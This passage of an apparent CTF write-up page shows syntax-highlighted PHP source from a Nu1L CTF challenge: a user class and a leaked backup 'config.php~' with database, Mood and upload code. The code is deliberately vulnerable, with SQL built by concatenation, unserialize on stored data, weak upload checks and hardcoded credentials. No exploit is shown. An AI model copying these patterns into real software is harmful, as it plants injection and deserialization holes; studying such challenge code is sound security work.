class="keyword">if</span>(<span class="variable">$ret</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;The username is not unique&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">publish</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_login</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;is_admin == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;signature&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mood&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$mood</span> = <span class="title function_ invoke__">addslashes</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Mood</span>((<span class="keyword">int</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;mood&#x27;</span>],<span class="title function_ invoke__">get_ip</span>())));</span><br><span class="line">                <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line">                @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">insert</span>(<span class="keyword">array</span>(<span class="string">&#x27;userid&#x27;</span>,<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;signature&#x27;</span>,<span class="string">&#x27;mood&#x27;</span>),<span class="string">&#x27;ctf_user_signature&#x27;</span>,<span class="keyword">array</span>(<span class="variable language_">$this</span>-&gt;userid,<span class="variable language_">$this</span>-&gt;username,<span class="variable">$_POST</span>[<span class="string">&#x27;signature&#x27;</span>],<span class="variable">$mood</span>));</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$ret</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">upload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>]))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&#x27;upload ok!&#x27;</span>;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;upload file error&quot;</span>;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">showmess</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_login</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;is_admin == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//id,sig,mood,ip,country,subtime</span></span><br><span class="line">            <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line">            @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select</span>(<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;signature&#x27;</span>,<span class="string">&#x27;mood&#x27;</span>,<span class="string">&#x27;id&#x27;</span>),<span class="string">&#x27;ctf_user_signature&#x27;</span>,<span class="string">&quot;userid = <span class="subst">$this</span>-&gt;userid order by id desc&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ret</span>) &#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$ret</span>-&gt;<span class="title function_ invoke__">fetch_row</span>()) &#123;</span><br><span class="line">                    <span class="variable">$sig</span> = <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">                    <span class="variable">$mood</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$row</span>[<span class="number">2</span>]);</span><br><span class="line">                    <span class="variable">$country</span> = <span class="variable">$mood</span>-&gt;<span class="title function_ invoke__">getcountry</span>();</span><br><span class="line">                    <span class="variable">$ip</span> = <span class="variable">$mood</span>-&gt;ip;</span><br><span class="line">                    <span class="variable">$subtime</span> = <span class="variable">$mood</span>-&gt;<span class="title function_ invoke__">getsubtime</span>();</span><br><span class="line">                    <span class="variable">$allmess</span> = <span class="keyword">array</span>(<span class="string">&#x27;id&#x27;</span>=&gt;<span class="variable">$row</span>[<span class="number">3</span>],<span class="string">&#x27;sig&#x27;</span> =&gt; <span class="variable">$sig</span>, <span class="string">&#x27;mood&#x27;</span> =&gt; <span class="variable">$mood</span>, <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$ip</span>, <span class="string">&#x27;country&#x27;</span> =&gt; <span class="variable">$country</span>, <span class="string">&#x27;subtime&#x27;</span> =&gt; <span class="variable">$subtime</span>);</span><br><span class="line">                    <span class="title function_ invoke__">array_push</span>(<span class="variable">$data</span>, <span class="variable">$allmess</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$data</span> = <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;data&#x27;</span>=&gt;<span class="variable">$data</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;adminpic/&#x27;</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_splice</span>(<span class="variable">$filenames</span>, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;data&#x27;</span>=&gt;<span class="variable">$filenames</span>));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">allow_diff_ip_option</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_login</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;is_admin == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;adio&#x27;</span>]))&#123;</span><br><span class="line">                <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line">                @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">update_single</span>(<span class="string">&#x27;ctf_users&#x27;</span>,<span class="string">&quot;id = <span class="subst">$this</span>-&gt;userid&quot;</span>,<span class="string">&#x27;allow_diff_ip&#x27;</span>,(<span class="keyword">int</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;adio&#x27;</span>]);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$ret</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;admin can\&#x27;t change this option&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deletemess</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_login</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;delid&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$delid</span> = (<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;delid&#x27;</span>];</span><br><span class="line">            <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>;</span><br><span class="line">            @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">delete</span>(<span class="string">&#x27;ctf_user_signature&#x27;</span>, <span class="string">&quot;userid = <span class="subst">$this</span>-&gt;userid and id = &#x27;<span class="subst">$delid</span>&#x27;&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ret</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>config.php~</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&quot;PRC&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$username</span> = <span class="string">&quot;Nu1L&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$password</span> = <span class="string">&quot;Nu1Lpassword233334&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$dbname</span> = <span class="string">&quot;nu1lctf&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;conn = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$this</span>-&gt;servername, <span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password, <span class="variable">$this</span>-&gt;dbname);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_column</span>(<span class="params"><span class="variable">$columns</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$columns</span>))</span><br><span class="line">            <span class="variable">$column</span> = <span class="string">&#x27; `&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;`,`&#x27;</span>,<span class="variable">$columns</span>).<span class="string">&#x27;` &#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="variable">$column</span> = <span class="string">&#x27; `&#x27;</span>.<span class="variable">$columns</span>.<span class="string">&#x27;` &#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$column</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$columns</span>,<span class="variable">$table</span>,<span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$column</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_column</span>(<span class="variable">$columns</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&#x27;select &#x27;</span>.<span class="variable">$column</span>.<span class="string">&#x27; from &#x27;</span>.<span class="variable">$table</span>.<span class="string">&#x27; where &#x27;</span>.<span class="variable">$where</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$columns</span>,<span class="variable">$table</span>,<span class="variable">$values</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$column</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_column</span>(<span class="variable">$columns</span>);</span><br><span class="line">        <span class="variable">$value</span> = <span class="string">&#x27;(&#x27;</span>.<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/`([^`,]+)`/&#x27;</span>,<span class="string">&#x27;\&#x27;$&#123;1&#125;\&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get_column</span>(<span class="variable">$values</span>)).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">        <span class="variable">$nid</span> =</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&#x27;insert into &#x27;</span>.<span class="variable">$table</span>.<span class="string">&#x27;(&#x27;</span>.<span class="variable">$column</span>.<span class="string">&#x27;) values &#x27;</span>.<span class="variable">$value</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"><span class="variable">$table</span>,<span class="variable">$where</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> =  <span class="string">&#x27;delete from &#x27;</span>.<span class="variable">$table</span>.<span class="string">&#x27; where &#x27;</span>.<span class="variable">$where</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_single</span>(<span class="params"><span class="variable">$table</span>,<span class="variable">$where</span>,<span class="variable">$column</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&#x27;update &#x27;</span>.<span class="variable">$table</span>.<span class="string">&#x27; set `&#x27;</span>.<span class="variable">$column</span>.<span class="string">&#x27;` = \&#x27;&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;\&#x27; where &#x27;</span>.<span class="variable">$where</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mood</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mood</span>, <span class="variable">$ip</span>, <span class="variable">$date</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$mood</span>, <span class="variable">$ip</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mood = <span class="variable">$mood</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ip  = <span class="variable">$ip</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;date = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getcountry</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ip</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;http://ip.taobao.com/service/getIpInfo.php?ip=&quot;</span>.<span class="variable">$this</span>-&gt;ip);</span><br><span class="line">        <span class="variable">$ip</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$ip</span>,<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ip</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;country&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getsubtime</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$now_date</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line">        <span class="variable">$sub_date</span> = (<span class="keyword">int</span>)<span class="variable">$now_date</span> - (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;date;</span><br><span class="line">        <span class="variable">$days</span> = (<span class="keyword">int</span>)(<span class="variable">$sub_date</span>/<span class="number">86400</span>);</span><br><span class="line">        <span class="variable">$hours</span> = (<span class="keyword">int</span>)(<span class="variable">$sub_date</span>%<span class="number">86400</span>/<span class="number">3600</span>);</span><br><span class="line">        <span class="variable">$minutes</span> = (<span class="keyword">int</span>)(<span class="variable">$sub_date</span>%<span class="number">86400</span>%<span class="number">3600</span>/<span class="number">60</span>);</span><br><span class="line">        <span class="variable">$res</span> = (<span class="variable">$days</span>&gt;<span class="number">0</span>)?<span class="string">&quot;<span class="subst">$days</span> days <span class="subst">$hours</span> hours <span class="subst">$minutes</span> minutes ago&quot;</span>:((<span class="variable">$hours</span>&gt;<span class="number">0</span>)?<span class="string">&quot;<span class="subst">$hours</span> hours <span class="subst">$minutes</span> minutes ago&quot;</span>:<span class="string">&quot;<span class="subst">$minutes</span> minutes ago&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file_size</span>  = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_size</span>&gt;<span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;pic is too big!&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span>!=<span class="string">&quot;image/jpeg&quot;</span> &amp;&amp; <span class="variable">$file_type</span>!=<span class="string">&#x27;image/pjpeg&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;file type invalid&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$uploaded_file</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$user_path</span> =  <span class="string">&quot;/app/adminpic&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$user_path</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$user_path</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file_true_name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>])[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_true_name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$file_true_name</span>);</span><br><span class="line">        <span class="variable">$file_true_name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$file_true_name</span>);</span><br><span class="line">        <span class="variable">$file_true_name</span> = <span class="variable">$file_true_name</span>.<span class="title function_ invoke__">time</span>().<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">100</span>).<span class="string">&#x27;.jpg&#x27;</span>;</span><br><span class="line">        <span class="variable">$move_to_file</span> = <span class="variable">$user_path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file_true_name</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$uploaded_file</span>,<span class="variable">$move_to_file</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$move_to_file</span>),<span class="string">&#x27;&lt;?php&#x27;</span>)&gt;=<span class="number">0</span>)</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="string">&#x27;sh /home/nu1lctf/clean_danger.sh&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$file_true_name</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span 